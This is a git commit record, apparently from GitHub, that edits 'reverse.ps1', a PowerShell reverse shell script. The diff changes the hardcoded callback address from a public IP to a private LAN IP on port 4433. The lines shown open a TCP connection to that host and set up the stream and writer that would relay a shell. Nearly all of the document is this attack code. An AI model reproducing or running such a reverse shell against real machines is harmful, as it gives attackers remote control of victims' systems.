fe7a8eb87cb19b87de65e9f007463e33a95c72ae
mayconbc <65556706+mayconbc@users.noreply.github.com>
2020-06-09 21:41:15 -0300

    Update reverse.ps1

--- reverse.ps1
+++ reverse.ps1
@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('187.59.132.140', 4433);
+$socket = new-object System.Net.Sockets.TcpClient('192.168.0.20', 4433);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
